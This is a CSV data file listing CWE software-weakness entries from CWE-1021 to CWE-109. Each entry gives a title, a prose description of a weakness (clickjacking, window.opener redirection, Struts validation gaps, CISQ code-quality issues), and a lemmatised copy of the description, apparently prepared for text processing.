CWE-1021,Improper Restriction of Rendered UI Layers or Frames,"The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.A web application is expected to place restrictions on whether it is allowed to be rendered within frames, iframes, objects, embed or applet elements. Without the restrictions, users can be tricked into interacting with the application when they were not intending to.",web application restrict incorrectly restrict frame object ui layer belong application domain lead user confusion interface user interact web application expect place restriction allow render frame iframe object embed applet element restriction user trick interact application intend
CWE-1022,Use of Web Link to Untrusted Target with window.opener Access,"The web application produces links to untrusted external sites outside of its sphere of control, but it does not properly prevent the external site from modifying security-critical properties of the window.opener object, such as the location property.When a user clicks a link to an external site (""target""), the target=""_blank"" attribute causes the target site's contents to be opened in a new window or tab, which runs in the same process as the original page. The window.opener object records information about the original page that offered the link. If an attacker can run script on the target page, then they could read or modify certain properties of the window.opener object, including the location property - even if the original and target site are not the same origin. An attacker can modify the location property to automatically redirect the user to a malicious site, e.g. as part of a phishing attack. Since this redirect happens in the original window/tab - which is not necessarily visible, since the browser is focusing the display on the new target page - the user might not notice any suspicious redirection.",web application produce link untrusted external site outside sphere control properly prevent external site modify security critical property object location property user click link external site target attribute cause target site content open new window tab run process original page object record information original page offer link attacker run script target page read modify certain property object include location property original target site origin attacker modify location property automatically redirect user malicious site phishing attack redirect happen original window tab necessarily visible browser focus display new target page user notice suspicious redirection
CWE-1023,Incomplete Comparison with Missing Factors,"The product performs a comparison between entities that must consider multiple factors or characteristics of each entity, but the comparison does not include one or more of these factors.An incomplete comparison can lead to resultant weaknesses, e.g., by operating on the wrong object or making a security decision without considering a required factor.",product perform comparison entity consider multiple factor characteristic entity comparison include factor incomplete comparison lead resultant weakness operate wrong object make security decision consider require factor
CWE-1024,Comparison of Incompatible Types,"The product performs a comparison between two entities, but the entities are of different, incompatible types that cannot be guaranteed to provide correct results when they are directly compared.In languages that are strictly typed but support casting/conversion, such as C or C++, the programmer might assume that casting one entity to the same type as another entity will ensure that the comparison will be performed correctly, but this cannot be guaranteed. In languages that are not strictly typed, such as PHP or JavaScript, there may be implicit casting/conversion to a type that the programmer is unaware of, causing unexpected results; for example, the string ""123"" might be converted to a number type. See examples.",product perform comparison entity entity different incompatible type guarantee provide correct result directly compare language strictly type support casting conversion c programmer assume cast entity type entity ensure comparison perform correctly guarantee language strictly type php javascript implicit casting conversion type programmer unaware cause unexpected result example string convert number type example
CWE-1025,Comparison Using Wrong Factors,"The code performs a comparison between two entities, but the comparison examines the wrong factors or characteristics of the entities, which can lead to incorrect results and resultant weaknesses.This can lead to incorrect results and resultant weaknesses. For example, the code might inadvertently compare references to objects, instead of the relevant contents of those objects, causing two ""equal"" objects to be considered unequal.",code perform comparison entity comparison examine wrong factor characteristic entity lead incorrect result resultant weakness lead incorrect result resultant weakness example code inadvertently compare reference object instead relevant content object cause equal object consider unequal
CWE-103,Struts: Incomplete validate() Method Definition,"The product has a validator form that either does not define a validate() method, or defines a validate() method but does not call super.validate().If the code does not call super.validate(), the Validation Framework cannot check the contents of the form against a validation form. In other words, the validation framework will be disabled for the given form.",product validator form define validate method define validate method code validation framework check content form validation form word validation framework disable give form
CWE-1037,Processor Optimization Removal or Modification of Security-critical Code,"The developer builds a security-critical protection mechanism into the software, but the processor optimizes the execution of the program such that the mechanism is removed or modified.",developer build security critical protection mechanism software processor optimize execution program mechanism remove modify
CWE-1038,Insecure Automated Optimizations,"The product uses a mechanism that automatically optimizes code, e.g. to improve a characteristic such as performance, but the optimizations can have an unintended side effect that might violate an intended security assumption.",product use mechanism automatically optimize code improve characteristic performance optimization unintended effect violate intended security assumption
CWE-1039,Automated Recognition Mechanism with Inadequate Detection or Handling of Adversarial Input Perturbations,"The product uses an automated mechanism such as machine learning to recognize complex data inputs (e.g. image or audio) as a particular concept or category, but it does not properly detect or handle inputs that have been modified or constructed in a way that causes the mechanism to detect a different, incorrect concept.When techniques such as machine learning are used to automatically classify input streams, and those classifications are used for security-critical decisions, then any mistake in classification can introduce a vulnerability that allows attackers to cause the product to make the wrong security decision. If the automated mechanism is not developed or ""trained"" with enough input data, then attackers may be able to craft malicious input that intentionally triggers the incorrect classification.Targeted technologies include, but are not necessarily limited to:automated speech recognitionautomated image recognitionFor example, an attacker might modify road signs or road surface markings to trick autonomous vehicles into misreading the sign/marking and performing a dangerous action.",product use automate mechanism machine learning recognize complex datum input image audio particular concept category properly detect handle input modify construct way cause mechanism detect different incorrect concept technique machine learning automatically classify input stream classification security critical decision mistake classification introduce vulnerability allow attacker cause product wrong security decision automate mechanism develop train input datum attacker able craft malicious input intentionally trigger incorrect classification targeted technology include necessarily limit automate speech recognitionautomated image recognitionfor example attacker modify road sign road surface marking trick autonomous vehicle misread sign marking perform dangerous action
CWE-104,Struts: Form Bean Does Not Extend Validation Class,"If a form bean does not extend an ActionForm subclass of the Validator framework, it can expose the application to other weaknesses related to insufficient input validation.",form bean extend actionform subclass validator framework expose application weakness relate insufficient input validation
CWE-1041,Use of Redundant Code,"The product has multiple functions, methods, procedures, macros, etc. that contain the same code.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. For example, if there are two copies of the same code, the programmer might fix a weakness in one copy while forgetting to fix the same weakness in another copy.",product multiple function method procedure macro etc contain code issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability example copy code programmer fix weakness copy forget fix weakness copy
CWE-1042,Static Member Data Element outside of a Singleton Class Element,"The code contains a member element that is declared as static (but not final), in which its parent class element is not a singleton class - that is, a class element that can be used only once in the 'to' association of a Create action.This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.",code contain member element declare static final parent class element singleton class class element association create action issue product perform slowly relevant code reachable attacker performance problem introduce vulnerability
CWE-1043,Data Element Aggregating an Excessively Large Number of Non-Primitive Elements,"The product uses a data element that has an excessively large number of sub-elements with non-primitive data types such as structures or aggregated objects.This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.While the interpretation of ""excessively large"" may vary for each product or developer, CISQ recommends a default of 5 sub-elements.",product use data element excessively large number sub element non primitive data type structure aggregate object issue product perform slowly relevant code reachable attacker performance problem introduce vulnerability interpretation excessively large vary product developer cisq recommend default sub element
CWE-1044,Architecture with Number of Horizontal Layers Outside of Expected Range,"The product's architecture contains too many - or too few - horizontal layers.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.While the interpretation of ""expected range"" may vary for each product or developer, CISQ recommends a default minimum of 4 layers and maximum of 8 layers.",product architecture contain horizontal layer issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability interpretation expect range vary product developer cisq recommend default minimum layer maximum layer
CWE-1045,Parent Class with a Virtual Destructor and a Child Class without a Virtual Destructor,"A parent class has a virtual destructor method, but the parent has a child class that does not have a virtual destructor.This issue can prevent the product from running reliably, since the child might not perform essential destruction operations. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability, such as a memory leak (CWE-401).",parent class virtual destructor method parent child class virtual destructor issue prevent product run reliably child perform essential destruction operation relevant code reachable attacker reliability problem introduce vulnerability memory leak
CWE-1046,Creation of Immutable Text Using String Concatenation,"The product creates an immutable text string using string concatenation operations.When building a string via a looping feature (e.g., a FOR or WHILE loop), the use of += to append to the existing string will result in the creation of a new object with each iteration. This programming pattern can be inefficient in comparison with use of text buffer data elements. This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this could be influenced to create performance problem.",product create immutable text string string concatenation operation build string looping feature loop use append exist string result creation new object iteration programming pattern inefficient comparison use text buffer datum element issue product perform slowly relevant code reachable attacker influence create performance problem
CWE-1047,Modules with Circular Dependencies,"The product contains modules in which one module has references that cycle back to itself, i.e., there are circular dependencies.As an example, with Java, this weakness might indicate cycles between packages.This issue makes it more difficult to maintain the product due to insufficient modularity, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",product contain module module reference cycle circular dependency example java weakness indicate cycle package issue make difficult maintain product insufficient modularity indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-1048,Invokable Control Element with Large Number of Outward Calls,"The code contains callable control elements that contain an excessively large number of references to other application objects external to the context of the callable, i.e. a Fan-Out value that is excessively large.While the interpretation of ""excessively large Fan-Out value"" may vary for each product or developer, CISQ recommends a default of 5 referenced objects.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code contain callable control element contain excessively large number reference application object external context callable fan value excessively large interpretation excessively large fan value vary product developer cisq recommend default reference object issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1049,Excessive Data Query Operations in a Large Data Table,"The product performs a data query with a large number of joins and sub-queries on a large data table.This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.While the interpretation of ""large data table"" and ""large number of joins or sub-queries"" may vary for each product or developer, CISQ recommends a default of 1 million rows for a ""large"" data table, a default minimum of 5 joins, and a default minimum of 3 sub-queries.",product perform data query large number join sub query large data table issue product perform slowly relevant code reachable attacker performance problem introduce vulnerability interpretation large datum table large number join sub query vary product developer cisq recommend default million row large data table default minimum join default minimum sub query
CWE-105,Struts: Form Field Without Validator,"The product has a form field that is not validated by a corresponding validation form, which can introduce other weaknesses related to insufficient input validation.Omitting validation for even a single input field may give attackers the leeway they need to compromise the product. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.",product form field validate corresponding validation form introduce weakness relate insufficient input validation omit validation single input field attacker leeway need compromise product application generally susceptible memory corruption attack application interface native code perform array bound checking attacker able use input validation mistake application launch buffer overflow attack
CWE-1050,Excessive Platform Resource Consumption within a Loop,"The product has a loop body or loop condition that contains a control element that directly or indirectly consumes platform resources, e.g. messaging, sessions, locks, or file descriptors.This issue can make the product perform more slowly. If an attacker can influence the number of iterations in the loop, then this performance problem might allow a denial of service by consuming more platform resources than intended.",product loop body loop condition contain control element directly indirectly consume platform resource messaging session lock file descriptor issue product perform slowly attacker influence number iteration loop performance problem allow denial service consume platform resource intend
CWE-1051,Initialization with Hard-Coded Network Resource Configuration Data,"The product initializes data using hard-coded values that act as network resource identifiers.This issue can prevent the product from running reliably, e.g. if it runs in an environment does not use the hard-coded network resource identifiers. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",product initialize datum hard code value act network resource identifier issue prevent product run reliably run environment use hard code network resource identifier relevant code reachable attacker reliability problem introduce vulnerability
CWE-1052,Excessive Use of Hard-Coded Literals in Initialization,"The product initializes a data element using a hard-coded literal that is not a simple integer or static constant element.This issue makes it more difficult to modify or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product initialize datum element hard code literal simple integer static constant element issue make difficult modify maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1053,Missing Documentation for Design,The product does not have documentation that represents how it is designed.This issue can make it more difficult to understand and maintain the product. It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.,product documentation represent design issue difficult understand maintain product difficult time consume detect fix vulnerability
CWE-1054,Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer,"The code at one architectural layer invokes code that resides at a deeper layer than the adjacent layer, i.e., the invocation skips at least one layer, and the invoked code is not part of a vertical utility layer that can be referenced from any horizontal layer.This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code architectural layer invoke code reside deep layer adjacent layer invocation skip layer invoke code vertical utility layer reference horizontal layer issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1055,Multiple Inheritance from Concrete Classes,"The product contains a class with inheritance from more than one concrete class.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product contain class inheritance concrete class issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1056,Invokable Control Element with Variadic Parameters,"A named-callable or method control element has a signature that supports a variable (variadic) number of parameters or arguments.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.With variadic arguments, it can be difficult or inefficient for manual analysis to be certain of which function/method is being invoked.",name callable method control element signature support variable variadic number parameter argument issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability variadic argument difficult inefficient manual analysis certain function method invoke
CWE-1057,Data Access Operations Outside of Expected Data Manager Component,"The product uses a dedicated, central data manager component as required by design, but it contains code that performs data-access operations that do not use this data manager.This issue can make the product perform more slowly than intended, since the intended central data manager may have been explicitly optimized for performance or other quality characteristics. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.",product use dedicated central datum manager component require design contain code perform data access operation use data manager issue product perform slowly intend intend central data manager explicitly optimize performance quality characteristic relevant code reachable attacker performance problem introduce vulnerability
CWE-1058,Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element,"The code contains a function or method that operates in a multi-threaded environment but owns an unsafe non-final static storable or member data element.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",code contain function method operate multi threaded environment own unsafe non final static storable member datum element issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-1059,Insufficient Technical Documentation,"The product does not contain sufficient technical or engineering documentation (whether on paper or in electronic form) that contains descriptions of all the relevant software/hardware elements of the product, such as its usage, structure, architectural components, interfaces, design, implementation, configuration, operation, etc.When technical documentation is limited or lacking, products are more difficult to maintain. This indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.When using time-limited or labor-limited third-party/in-house security consulting services (such as threat modeling, vulnerability discovery, or pentesting), insufficient documentation can force those consultants to invest unnecessary time in learning how the product is organized, instead of focusing their expertise on finding the flaws or suggesting effective mitigations.With respect to hardware design, the lack of a formal, final manufacturer reference can make it difficult or impossible to evaluate the final product, including post-manufacture verification. One cannot ensure that design functionality or operation is within acceptable tolerances, conforms to specifications, and is free from unexpected behavior. Hardware-related documentation may include engineering artifacts such as hardware description language (HDLs), netlists, Gerber files, Bills of Materials, EDA (Electronic Design Automation) tool files, etc.",product contain sufficient technical engineering documentation paper electronic form contain description relevant software hardware element product usage structure architectural component interface design implementation configuration operation etc technical documentation limited lack product difficult maintain indirectly affect security make difficult time consume find fix vulnerability time limit labor limit party house security consulting service threat modeling vulnerability discovery pentesting insufficient documentation force consultant invest unnecessary time learn product organize instead focus expertise find flaw suggest effective mitigation respect hardware design lack formal final manufacturer reference difficult impossible evaluate final product include post manufacture verification ensure design functionality operation acceptable tolerance conform specification free unexpected behavior hardware relate documentation include engineering artifact hardware description language hdls netlist gerber file bills materials eda electronic design automation tool file etc
CWE-106,Struts: Plug-in Framework not in Use,"When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation.Unchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.",application use input validation framework struts validator great risk introduce weakness relate insufficient input validation unchecked input lead cause vulnerability application unchecked input lead cross site scripting process control sql injection vulnerability application generally susceptible memory corruption attack application interface native code perform array bound checking attacker able use input validation mistake application launch buffer overflow attack
CWE-1060,Excessive Number of Inefficient Server-Side Data Accesses,"The product performs too many data queries without using efficient data processing functionality such as stored procedures.This issue can make the product perform more slowly due to computational expense. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.While the interpretation of ""too many data queries"" may vary for each product or developer, CISQ recommends a default maximum of 5 data queries for an inefficient function/procedure.",product perform datum query efficient datum processing functionality store procedure issue product perform slowly computational expense relevant code reachable attacker performance problem introduce vulnerability interpretation data query vary product developer cisq recommend default maximum datum query inefficient function procedure
CWE-1061,Insufficient Encapsulation,"The product does not sufficiently hide the internal representation and implementation details of data or methods, which might allow external components or modules to modify data unexpectedly, invoke unexpected functionality, or introduce dependencies that the programmer did not intend.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product sufficiently hide internal representation implementation detail datum method allow external component module modify datum unexpectedly invoke unexpected functionality introduce dependency programmer intend issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1062,Parent Class with References to Child Class,"The code has a parent class that contains references to a child class, its methods, or its members.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",code parent class contain reference child class method member issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-1063,Creation of Class Instance within a Static Code Block,"A static code block creates an instance of a class.This pattern identifies situations where a storable data element or member data element is initialized with a value in a block of code which is declared as static.This issue can make the product perform more slowly by performing initialization before it is needed. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.",static code block create instance class pattern identify situation storable data element member datum element initialize value block code declare static issue product perform slowly perform initialization need relevant code reachable attacker performance problem introduce vulnerability
CWE-1064,Invokable Control Element with Signature Containing an Excessive Number of Parameters,"The product contains a function, subroutine, or method whose signature has an unnecessarily large number of parameters/arguments.This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.While the interpretation of ""large number of parameters."" may vary for each product or developer, CISQ recommends a default maximum of 7 parameters/arguments.",product contain function subroutine method signature unnecessarily large number parameter argument issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability interpretation large number parameter vary product developer cisq recommend default maximum parameter argument
CWE-1065,Runtime Resource Management Control Element in a Component Built to Run on Application Servers,"The product uses deployed components from application servers, but it also uses low-level functions/methods for management of resources, instead of the API provided by the application server.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",product use deploy component application server use low level function method management resource instead api provide application server issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-1066,Missing Serialization Control Element,"The product contains a serializable data element that does not have an associated serialization method.This issue can prevent the product from running reliably, e.g. by triggering an exception. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.",product contain serializable datum element associate serialization method issue prevent product run reliably trigger exception relevant code reachable attacker reliability problem introduce vulnerability example serializable nature data element come serializable serializableattribute attribute inheritance serializable interface java
CWE-1067,Excessive Execution of Sequential Searches of Data Resource,"The product contains a data query against an SQL table or view that is configured in a way that does not utilize an index and may cause sequential searches to be performed.This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.",product contain datum query sql table view configure way utilize index cause sequential search perform issue product perform slowly relevant code reachable attacker performance problem introduce vulnerability
CWE-1068,Inconsistency Between Implementation and Documented Design,"The implementation of the product is not consistent with the design as described within the relevant documentation.This issue makes it more difficult to maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",implementation product consistent design describe relevant documentation issue make difficult maintain product inconsistency indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1069,Empty Exception Block,"An invokable code block contains an exception handling block that does not contain any code, i.e. is empty.When an exception handling block (such as a Catch and Finally block) is used, but that block is empty, this can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",invokable code block contain exception handle block contain code exception handle block catch finally block block prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-107,Struts: Unused Validation Form,An unused validation form indicates that validation logic is not up-to-date.It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.,unused validation form indicate validation logic date easy developer forget update validation logic remove rename action form mapping indication validation logic properly maintain presence unused validation form
CWE-1070,Serializable Data Element Containing non-Serializable Item Elements,"The product contains a serializable, storable data element such as a field or member, but the data element contains member elements that are not serializable.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.",product contain serializable storable data element field member data element contain member element serializable issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability example serializable nature data element come serializable serializableattribute attribute inheritance serializable interface java
CWE-1071,Empty Code Block,"The source code contains a block that does not contain any code, i.e., the block is empty.Empty code blocks can occur in the bodies of conditionals, function or method definitions, exception handlers, etc. While an empty code block might be intentional, it might also indicate incomplete implementation, accidental code deletion, unexpected macro expansion, etc. For some programming languages and constructs, an empty block might be allowed by the syntax, but the lack of any behavior within the block might violate a convention or API in such a way that it is an error.",source code contain block contain code block code block occur body conditional function method definition exception handler etc code block intentional indicate incomplete implementation accidental code deletion unexpected macro expansion etc programming language construct block allow syntax lack behavior block violate convention api way error
CWE-1072,Data Resource Access without Use of Connection Pooling,"The product accesses a data resource through a database without using a connection pooling capability.This issue can make the product perform more slowly, as connection pools allow connections to be reused without the overhead and time consumption of opening and closing a new connection. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.",product access datum resource database connection pooling capability issue product perform slowly connection pool allow connection reuse overhead time consumption open close new connection relevant code reachable attacker performance problem introduce vulnerability
CWE-1073,Non-SQL Invokable Control Element with Excessive Number of Data Resource Accesses,"The product contains a client with a function or method that contains a large number of data accesses/queries that are sent through a data manager, i.e., does not use efficient database capabilities.This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.While the interpretation of ""large number of data accesses/queries"" may vary for each product or developer, CISQ recommends a default maximum of 2 data accesses per function/method.",product contain client function method contain large number datum access query send data manager use efficient database capability issue product perform slowly relevant code reachable attacker performance problem introduce vulnerability interpretation large number datum access query vary product developer cisq recommend default maximum datum access function method
CWE-1074,Class with Excessively Deep Inheritance,"A class has an inheritance level that is too high, i.e., it has a large number of parent classes.This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.While the interpretation of ""large number of parent classes"" may vary for each product or developer, CISQ recommends a default maximum of 7 parent classes.",class inheritance level high large number parent class issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability interpretation large number parent class vary product developer cisq recommend default maximum parent class
CWE-1075,Unconditional Control Flow Transfer outside of Switch Block,"The product performs unconditional control transfer (such as a ""goto"") in code outside of a branching structure such as a switch block.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product perform unconditional control transfer goto code outside branch structure switch block issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1076,Insufficient Adherence to Expected Conventions,"The product's architecture, source code, design, documentation, or other artifact does not follow required conventions.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product architecture source code design documentation artifact follow require convention issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1077,Floating Point Comparison with Incorrect Operator,"The code performs a comparison such as an equality test between two float (floating point) values, but it uses comparison operators that do not account for the possibility of loss of precision.Numeric calculation using floating point values can generate imprecise results because of rounding errors. As a result, two different calculations might generate numbers that are mathematically equal, but have slightly different bit representations that do not translate to the same mathematically-equal values. As a result, an equality test or other comparison might produce unexpected results.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",code perform comparison equality test float float point value use comparison operator account possibility loss precision numeric calculation float point value generate imprecise result rounding error result different calculation generate number mathematically equal slightly different bit representation translate mathematically equal value result equality test comparison produce unexpected result issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-1078,Inappropriate Source Code Style or Formatting,"The source code does not follow desired style or formatting for indentation, white space, comments, etc.",source code follow desire style formatting indentation white space comment etc
CWE-1079,Parent Class without Virtual Destructor Method,"A parent class contains one or more child classes, but the parent class does not have a virtual destructor method.This issue can prevent the product from running reliably due to undefined or unexpected behaviors. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",parent class contain child class parent class virtual destructor method issue prevent product run reliably undefined unexpected behavior relevant code reachable attacker reliability problem introduce vulnerability
CWE-108,Struts: Unvalidated Action Form,"Every Action Form must have a corresponding validation form.If a Struts Action Form Mapping specifies a form, it must have a validation form defined under the Struts Validator.",action form correspond validation form struts action form mapping specify form validation form define struts validator
CWE-1080,Source Code File with Excessive Number of Lines of Code,"A source code file has too many lines of code.This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.While the interpretation of ""too many lines of code"" may vary for each product or developer, CISQ recommends a default threshold value of 1000.",source code file line code issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability interpretation line code vary product developer cisq recommend default threshold value
CWE-1082,Class Instance Self Destruction Control Element,"The code contains a class instance that calls the method or function to delete or destroy itself.For example, in C++, ""delete this"" will cause the object to delete itself.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",code contain class instance call method function delete destroy example delete cause object delete issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-1083,Data Access from Outside Expected Data Manager Component,"The product is intended to manage data access through a particular data manager component such as a relational or non-SQL database, but it contains code that performs data access operations without using that component.When the product has a data access component, the design may be intended to handle all data access operations through that component. If a data access operation is performed outside of that component, then this may indicate a violation of the intended design.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",product intend manage datum access particular data manager component relational non sql database contain code perform datum access operation component product datum access component design intend handle datum access operation component datum access operation perform outside component indicate violation intended design issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-1084,Invokable Control Element with Excessive File or Data Access Operations,"A function or method contains too many operations that utilize a data manager or file resource.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.While the interpretation of ""too many operations"" may vary for each product or developer, CISQ recommends a default maximum of 7 operations for the same data manager or file.",function method contain operation utilize data manager file resource issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability interpretation operation vary product developer cisq recommend default maximum operation data manager file
CWE-1085,Invokable Control Element with Excessive Volume of Commented-out Code,"A function, method, procedure, etc. contains an excessive amount of code that has been commented out within its body.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.While the interpretation of ""excessive volume"" may vary for each product or developer, CISQ recommends a default threshold of 2% of commented code.",function method procedure etc contain excessive code comment body issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability interpretation excessive volume vary product developer cisq recommend default threshold comment code
CWE-1086,Class with Excessive Number of Child Classes,"A class contains an unnecessarily large number of children.This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.While the interpretation of ""large number of children"" may vary for each product or developer, CISQ recommends a default maximum of 10 child classes.",class contain unnecessarily large number child issue make difficult understand maintain software indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability interpretation large number child vary product developer cisq recommend default maximum child class
CWE-1087,Class with Virtual Method without a Virtual Destructor,"A class contains a virtual method, but the method does not have an associated virtual destructor.This issue can prevent the product from running reliably, e.g. due to undefined behavior. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",class contain virtual method method associate virtual destructor issue prevent product run reliably undefined behavior relevant code reachable attacker reliability problem introduce vulnerability
CWE-1088,Synchronous Access of Remote Resource without Timeout,"The code has a synchronous call to a remote resource, but there is no timeout for the call, or the timeout is set to infinite.This issue can prevent the product from running reliably, since an outage for the remote resource can cause the product to hang. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",code synchronous remote resource timeout timeout set infinite issue prevent product run reliably outage remote resource cause product hang relevant code reachable attacker reliability problem introduce vulnerability
CWE-1089,Large Data Table with Excessive Number of Indices,"The product uses a large data table that contains an excessively large number of indices.This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.While the interpretation of ""large data table"" and ""excessively large number of indices"" may vary for each product or developer, CISQ recommends a default threshold of 1000000 rows for a ""large"" table and a default threshold of 3 indices.",product use large data table contain excessively large number index issue product perform slowly relevant code reachable attacker performance problem introduce vulnerability interpretation large datum table excessively large number index vary product developer cisq recommend default threshold row large table default threshold index
CWE-109,Struts: Validator Turned Off,"Automatic filtering via a Struts bean has been turned off, which disables the Struts Validator and custom validation logic. This exposes the application to other weaknesses related to insufficient input validation.",automatic filtering struts bean turn disable struts validator custom validation logic expose application weakness relate insufficient input validation
